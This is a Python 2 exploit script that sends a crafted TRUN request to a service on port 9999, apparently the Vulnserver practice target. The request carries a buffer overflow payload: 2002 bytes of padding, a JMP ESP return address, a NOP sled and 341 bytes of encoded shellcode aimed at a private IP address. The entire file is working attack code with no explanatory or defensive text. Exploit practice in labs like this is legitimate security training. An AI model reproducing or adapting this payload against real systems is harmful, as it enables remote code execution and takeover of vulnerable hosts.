#!/usr/bin/python

import socket

ip = '192.168.100.142'
#625011AF   FFE4             JMP ESP
#341
shellcode=(
"\xd9\xc1\xd9\x74\x24\xf4\xba\xef\xc9\xf6\xa8\x5e\x33\xc9" 
"\xb1\x4f\x83\xee\xfc\x31\x56\x15\x03\x56\x15\x0d\x3c\x0a" 
"\x40\x58\xbf\xf3\x91\x3a\x49\x16\xa0\x68\x2d\x52\x91\xbc" 
"\x25\x36\x1a\x37\x6b\xa3\xa9\x35\xa4\xc4\x1a\xf3\x92\xeb" 
"\x9b\x32\x1b\xa7\x58\x55\xe7\xba\x8c\xb5\xd6\x74\xc1\xb4" 
"\x1f\x68\x2a\xe4\xc8\xe6\x99\x18\x7c\xba\x21\x19\x52\xb0" 
"\x1a\x61\xd7\x07\xee\xdb\xd6\x57\x5f\x50\x90\x4f\xeb\x3e" 
"\x01\x71\x38\x5d\x7d\x38\x35\x95\xf5\xbb\x9f\xe4\xf6\x8d" 
"\xdf\xaa\xc8\x21\xd2\xb3\x0d\x85\x0d\xc6\x65\xf5\xb0\xd0" 
"\xbd\x87\x6e\x55\x20\x2f\xe4\xcd\x80\xd1\x29\x8b\x43\xdd" 
"\x86\xd8\x0c\xc2\x19\x0d\x27\xfe\x92\xb0\xe8\x76\xe0\x96" 
"\x2c\xd2\xb2\xb7\x75\xbe\x15\xc8\x66\x66\xc9\x6c\xec\x85" 
"\x1e\x16\xaf\xc1\xd3\x24\x50\x12\x7c\x3f\x23\x20\x23\xeb" 
"\xab\x08\xac\x35\x2b\x6e\x87\x81\xa3\x91\x28\xf1\xea\x55" 
"\x7c\xa1\x84\x7c\xfd\x2a\x55\x80\x28\xfc\x05\x2e\x83\xbc" 
"\xf5\x8e\x73\x54\x1c\x01\xab\x44\x1f\xcb\xda\x43\x88\x34" 
"\x74\x2f\x68\xdd\x87\xaf\x6b\xa6\x01\x49\x01\xc8\x47\xc2" 
"\xbe\x71\xc2\x98\x5f\x7d\xd8\x08\xc3\xec\x87\xc8\x8a\x0c" 
"\x10\x9f\xdb\xe3\x69\x75\xf6\x5a\xc0\x6b\x0b\x3a\x2b\x2f" 
"\xd0\xff\xb2\xae\x95\x44\x91\xa0\x63\x44\x9d\x94\x3b\x13" 
"\x4b\x42\xfa\xcd\x3d\x3c\x54\xa1\x97\xa8\x21\x89\x27\xae" 
"\x2d\xc4\xd1\x4e\x9f\xb1\xa7\x71\x10\x56\x20\x0a\x4c\xc6" 
"\xcf\xc1\xd4\xf6\x85\x4b\x7c\x9f\x43\x1e\x3c\xc2\x73\xf5" 
"\x03\xfb\xf7\xff\xfb\xf8\xe8\x8a\xfe\x45\xaf\x67\x73\xd5" 
"\x5a\x87\x20\xd6\x4e")


jmp = "\xAF\x11\x50\x62"
nop = "\x90"*25

buffer = "A"*2002 + jmp + nop + shellcode + "C"*(5010-2002-4-25-341)



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,9999))
s.recv(1024)
s.send("TRUN /.../" + buffer)
s.close
